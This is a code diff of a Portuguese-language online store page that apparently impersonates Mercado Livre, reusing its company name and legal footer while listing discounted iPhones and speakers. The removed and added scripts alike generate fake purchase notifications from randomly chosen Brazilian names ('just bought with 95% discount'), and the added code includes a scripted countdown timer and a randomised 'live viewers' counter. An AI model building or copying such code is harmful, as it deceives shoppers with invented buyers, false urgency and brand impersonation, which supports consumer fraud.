-          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
-            <div class="free-shipping-container">
-              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
-                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
-                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">ESGOTADO</span>
-              </span>
-            </div>
-          </div>
-          <p class="product-name">JBL GO 4 <span style="font-family: 'GellixBold';">Preta</span>
-          </p>
-        </div>
-      </div>
-      <div class="bracelet-item">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/iphone_15_azul.jpg" style="height: 115px; width: auto; margin-top: 20px;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
-            <div class="free-shipping-container">
-              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
-                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
-                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">ESGOTADO</span>
-              </span>
-            </div>
-          </div>
-          <p class="product-name">Apple iPhone 15 Pro Max (256 GB) <span style="font-family: 'GellixBold';">Azul</span>
-          </p>
-        </div>
-      </div>
-      <div class="bracelet-item">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/iphone_15_verde.jpg" style="height: 115px; width: auto; margin-top: 20px;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
-            <div class="free-shipping-container">
-              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
-                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
-                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">ESGOTADO</span>
-              </span>
-            </div>
-          </div>
-          <p class="product-name">iPhone 15 Pro Max (256 GB) <span style="font-family: 'GellixBold';">Verde</span>
-          </p>
-        </div>
-      </div>
-      <div class="bracelet-item">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/dourado.jpg" style="height: 115px; width: auto; margin-top: 20px;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
-            <div class="free-shipping-container">
-              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
-                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
-                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">ESGOTADO</span>
-              </span>
-            </div>
-          </div>
-          <p class="product-name">Apple iPhone 15 Pro Max (256 GB) <span style="font-family: 'GellixBold';">Dourado</span>
-          </p>
-        </div>
-      </div>
-      <div class="bracelet-item">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/ipad_10.jpg" style="height: 115px; width: auto; margin-top: 20px;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
-            <div class="free-shipping-container">
-              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
-                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
-                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">ESGOTADO</span>
-              </span>
-            </div>
-          </div>
-          <p class="product-name">Apple iPhone 15 Pro Max (256 GB) <span>Titânio Azul</span>
-          </p>
-        </div>
-      </div>
-    </div>
-    <div class="divisoria2"></div>
-    <p style="margin-left: 3%; margin-right: 3%; font-family: 'GellixRegular'; font-size: 14px; padding-top: 5px;">
-      <span style="font-family: 'GellixSemiBold';">Termos e condições. Como cuidamos da sua privacidade. Acessibilidade Informações sobre seguros Blog Afiliados Tendências</span>
-      <br>
-      <br>© 1999-2024 Ebazar.com.br LTDA. CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre. <span style="font-family: 'GellixSemiBold';">
-        <br>
-        <br>Brasil/Português </span>
-    </p>
-
-
-<script src="js/notiflix-aio-2.6.0.min.js"></script>
-
-       <script> /right-top, right-bottom, left-top, left-bottom, center-top, center-bottom, center-center/
-        var position = "left-bottom";
- 
-        /verde, azul, vermelho, amarelo/
-        var color = "verde";
- 
-        /fade, zoom, from-right, from-left, from-top, from-bottom/
-        var animation = "from-left";
- 
-        /nome do produto/
-        var product_name = "";
- 
-        /frase depois do nome da pessoa/
-        var phrase = "acabou de comprar com 95% de desconto";
-        var timeout = 5000;
- 
-        /masc, fem, any/
-        var type_name = "masc, fem";
-        var msg_final = "";
- 
-        var min_time = 5;
-        var max_time = 10;
- 
-        var names_masc = ['Jose', 'Joao', 'Antonio', 'Francisco', 'Carlos', 'Paulo', 'Pedro', 'Lucas', 'Luiz', 'Marcos', 'Luis', 'Gabriel', 'Rafael', 'Daniel', 'Marcelo', 'Bruno', 'Eduardo', 'Felipe', 'Rodrigo', 'Manoel', 'Mateus', 'Andre', 'Fernando', 'Fabio', 'Leonardo', 'Gustavo', 'Guilherme', 'Leandro', 'Tiago', 'Anderson', 'Ricardo', 'Marcio', 'Jorge', 'Alexandre', 'Roberto', 'Edson', 'Diego', 'Vitor', 'Sergio', 'Claudio', 'Matheus', 'Thiago', 'Geraldo', 'Adriano', 'Luciano', 'Julio', 'Renato', 'Alex', 'Vinicius', 'Rogerio', 'Samuel', 'Ronaldo', 'Mario', 'Flavio', 'Douglas', 'Igor', 'Davi', 'Manuel', 'Jeferson', 'Cicero', 'Victor', 'Miguel', 'Robson', 'Mauricio', 'Danilo', 'Henrique', 'Caio', 'Reginaldo', 'Joaquim', 'Benedito', 'Gilberto', 'Marco', 'Alan', 'Nelson', 'Cristiano', 'Elias', 'Wilson', 'Valdir', 'Emerson', 'Luan', 'David', 'Renan', 'Severino', 'Fabricio', 'Mauro', 'Jonas', 'Gilmar', 'Jean', 'Fabiano', 'Wesley', 'Diogo', 'Adilson', 'Jair', 'Alessandro', 'Everton', 'Osvaldo', 'Gilson', 'Willian', 'Joel', 'Silvio', 'Helio', 'Maicon', 'Reinaldo', 'Pablo', 'Artur', 'Vagner', 'Valter', 'Celso', 'Ivan', 'Cleiton', 'Vanderlei', 'Vicente', 'Arthur', 'Milton', 'Domingos', 'Wagner', 'Sandro', 'Moises', 'Edilson', 'Ademir', 'Adao', 'Evandro', 'Cesar', 'Valmir', 'Murilo', 'Juliano', 'Edvaldo', 'Ailton', 'Junior', 'Breno', 'Nicolas', 'Ruan', 'Alberto', 'Rubens', 'Nilton', 'Augusto', 'Cleber', 'Osmar', 'Nilson', 'Hugo', 'Otavio', 'Vinicios', 'Italo', 'Wilian', 'Alisson', 'Aparecido'];
-        var names_fem = ['Maria', 'Ana', 'Francisca', 'Antonia', 'Adriana', 'Juliana', 'Marcia', 'Fernanda', 'Patricia', 'Aline', 'Sandra', 'Camila', 'Amanda', 'Bruna', 'Jessica', 'Leticia', 'Julia', 'Luciana', 'Vanessa', 'Mariana', 'Gabriela', 'Vera', 'Vitoria', 'Larissa', 'Claudia', 'Beatriz', 'Rita', 'Luana', 'Sonia', 'Renata', 'Eliane'];
- 
-        var option = {
-            position: position,
-            cssAnimationStyle: animation,
-            plainText: false,
-            timeout: timeout
-        };
- 
-        function show_notification() {
-            if (type_name == "masc") {
-                msg_final = "<strong>" + names_masc[Math.floor(Math.random() * names_masc.length)] + "</strong>";
-            } else if (type_name == "fem") {
-                msg_final = "<strong>" + names_fem[Math.floor(Math.random() * names_fem.length)] + "</strong>";
-            } else {
-                var array_aux = ["masc", "fem"];
- 
-                if (array_aux[Math.floor(Math.random() * array_aux.length)] == "masc") {
-                    msg_final = "<strong>" + names_masc[Math.floor(Math.random() * names_masc.length)] + "</strong>";
-                } else {
-                    msg_final = "<strong>" + names_fem[Math.floor(Math.random() * names_fem.length)] + "</strong>";
-                }
-            }
- 
-            msg_final += decodeURIComponent(escape(" " + phrase + " " + product_name));
- 
-            if (color == "verde") {
-                Notiflix.Notify.Success(msg_final, option);
-            }
- 
-            if (color == "azul") {
-                Notiflix.Notify.Info(msg_final, option);
-            }
- 
-            if (color == "vermelho") {
-                Notiflix.Notify.Failure(msg_final, option);
-            }
- 
-            if (color == "amarelo") {
-                Notiflix.Notify.Success(msg_final, option);
-            }
- 
-            var rand = Math.floor(Math.random() * (max_time - min_time + 1) + min_time);
-            setTimeout(show_notification, rand * 1000);
+/* ===== INTERSECTION OBSERVER FOR CARDS ===== */
+function observeCards() {
+  var cards = document.querySelectorAll('.product-card:not(.visible)');
+  if ('IntersectionObserver' in window) {
+    var obs = new IntersectionObserver(function(entries) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          entry.target.classList.add('visible');
+          obs.unobserve(entry.target);
         }
-            setTimeout(show_notification, 7 * 1000);
+      });
+    }, { threshold: 0.1, rootMargin: '50px' });
+    cards.forEach(function(c) { obs.observe(c); });
+  } else {
+    cards.forEach(function(c) { c.classList.add('visible'); });
+  }
+}
+
+/* ===== ANIMATE STOCK BARS ===== */
+function animateStockBars() {
+  setTimeout(function() {
+    var fills = document.querySelectorAll('.stock-bar-fill');
+    fills.forEach(function(f) {
+      f.style.width = f.getAttribute('data-width') + '%';
+    });
+  }, 300);
+}
+
+/* ===== COUNTDOWN TIMER ===== */
+(function() {
+  var h = 1, m = 25, s = 39;
+  var hEl = document.getElementById('cdH');
+  var mEl = document.getElementById('cdM');
+  var sEl = document.getElementById('cdS');
+  setInterval(function() {
+    if (--s < 0) { s = 59; m--; }
+    if (m < 0) { m = 59; h--; }
+    if (h < 0) { h = 0; m = 0; s = 0; }
+    hEl.textContent = h.toString().padStart(2, '0');
+    mEl.textContent = m.toString().padStart(2, '0');
+    sEl.textContent = s.toString().padStart(2, '0');
+  }, 1000);
+})();
+
+/* ===== LIVE VIEWERS COUNTER ===== */
+(function() {
+  var el = document.getElementById('liveViewers');
+  var base = 200 + Math.floor(Math.random() * 120);
+  el.textContent = base;
+  setInterval(function() {
+    base += Math.floor(Math.random() * 7) - 3;
+    if (base < 140) base = 145 + Math.floor(Math.random() * 20);
+    if (base > 380) base = 350 - Math.floor(Math.random() * 20);
+    el.textContent = base;
+  }, 4000);
+})();
+
+/* ===== CART BADGE ===== */
+function updateCartBadge() {
+  var badge = document.getElementById('cartBadge');
+  try {
+    var items = JSON.parse(localStorage.getItem('ml_cart') || '[]');
+    var count = 0;
+    for (var i = 0; i < items.length; i++) count += items[i].quantity || 1;
+    badge.textContent = count;
+    if (count > 0) { badge.classList.add('visible'); }
+    else { badge.classList.remove('visible'); }
+  } catch(e) {
+    badge.classList.remove('visible');
+  }
+}
+
+function handleCartClick() {
+  try {
+    var items = JSON.parse(localStorage.getItem('ml_cart') || '[]');
+    if (items.length > 0) {
+      var qs = window.location.search;
+      window.location.href = '../checkout/index.html' + qs;
+    } else {
+      showCartToast();
+    }
+  } catch(e) {
+    showCartToast();
+  }
+}
+
+function showCartToast() {
+  var toast = document.getElementById('cartToast');
+  toast.classList.add('show');
+  setTimeout(function() { toast.classList.remove('show'); }, 2500);
+}
+
+/* ===== FILTER PILLS ===== */
+document.querySelectorAll('.filter-pill').forEach(function(pill) {
+  pill.addEventListener('click', function() {
+    document.querySelectorAll('.filter-pill').forEach(function(p) { p.classList.remove('active'); });
+    this.classList.add('active');
+    renderProducts(this.getAttribute('data-cat'));
+  });
+});
+
+/* ===== SOCIAL PROOF NOTIFICATIONS ===== */
+(function() {
+  var names = ['Carlos','Maria','Joao','Ana','Pedro','Juliana','Rafael','Fernanda','Lucas','Adriana','Bruno','Camila','Gabriel','Patricia','Diego','Amanda','Thiago','Vanessa','Marcos','Leticia','Eduardo','Beatriz','Vinicius','Larissa','Felipe','Mariana','Gustavo','Bruna','Matheus','Julia','Ricardo','Gabriela','Daniel','Aline','Leonardo','Jessica','Anderson','Claudia','Igor','Sandra','Caio','Renata','Samuel','Luana','Rodrigo','Vitoria','Hugo','Sonia','Davi','Eliane'];
+  var notifEl = document.getElementById('socialNotif');
+  var nameEl = document.getElementById('socialName');
+  var timeEl = document.getElementById('socialTime');
+  var times = ['agora','ha 1 min','ha 2 min','ha 3 min','ha 5 min'];
+
+  function showNotif() {
+    var name = names[Math.floor(Math.random() * names.length)];
+    var t = times[Math.floor(Math.random() * times.length)];
+    nameEl.textContent = name;
+    timeEl.textContent = t;
+    notifEl.classList.add('show');
+    setTimeout(function() { notifEl.classList.remove('show'); }, 4500);
+    var next = (Math.floor(Math.random() * 8) + 5) * 1000;
+    setTimeout(showNotif, next);
+  }
+  setTimeout(showNotif, 6000);
+})();
+
+/* ===== INIT ===== */
+document.addEventListener('DOMContentLoaded', function() {
+  renderProducts('todos');
+  updateCartBadge();
+  // Listen for storage changes (cart updates from other pages)
+  window.addEventListener('storage', updateCartBadge);
+});
 </script>
+
 <!-- Page View Tracker -->
 <script>
 (function(){
@@ -898,7 +1122,9 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     if(v) qs += '&' + k + '=' + encodeURIComponent(v);
   });
   var img = new Image();
-  img.src = '/api/track.php?' + qs;
+  img.src = '/api/track.php?' + qs + '&t=' + Date.now();
 })();
 </script>
-</body><!-- Mirrored from exclusivalojas.com/loja/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 15 Oct 2024 14:43:04 GMT --></html>
+
+</body>
+</html>
